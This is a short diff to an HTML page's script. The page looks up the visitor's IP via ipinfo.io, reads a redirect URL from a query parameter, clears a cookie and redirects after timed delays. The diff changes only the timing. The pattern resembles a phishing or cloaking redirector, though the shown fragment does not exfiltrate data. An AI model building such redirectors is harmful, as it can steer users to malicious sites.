@@ -11,6 +11,9 @@ body {
 </style>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 <script>
+function red() {
+  window.location.href = u;
+}
 function vef() {
   $.getJSON('https://ipinfo.io/json', function(data) {
     var ip=data.ip;
@@ -29,9 +32,9 @@ function vef() {
     u = u.split("=")[1]
   }
   document.cookie = "hr=href;expires=Thu, 01 Jan 1970 00:00:00 GMT";
-  window.location.href = u;
+  setTimeout(red,1000);
 }
-setTimeout(vef, 5000);
+setTimeout(vef, 4000);
 </script>
 </head>
 <body>
